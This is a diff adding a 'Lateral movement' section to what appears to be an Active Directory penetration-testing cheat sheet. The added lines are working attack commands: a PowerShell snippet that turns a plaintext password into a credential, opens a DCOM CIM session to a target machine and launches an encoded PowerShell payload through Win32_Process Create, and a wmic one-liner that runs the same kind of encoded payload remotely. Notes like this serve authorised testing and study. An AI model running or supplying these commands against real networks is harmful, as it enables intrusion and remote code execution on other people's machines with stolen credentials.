@@ -258,3 +258,22 @@ Find-DomainShare #-CheckShareAccess
 
 resolve local machine address
 `nslookup.exe $ADDRESS`
+
+Lateral movement
+---
+#lateral-ad-movement #dcom #cim-session
+```powershell
+$username = $USER;
+$password = $PASS;
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+$options = New-CimSessionOption -Protocol DCOM
+$session = New-Cimsession -ComputerName $TARGET_IP -Credential $credential -SessionOption $Options
+$command = 'powershell -e JA....AA==';
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+```
+
+#wmic #process-create
+```powershell
+wmic /node:$TARGET_IP /user:$USER /password:$PASS process call create 'powershell -e JA....AA=='
+```
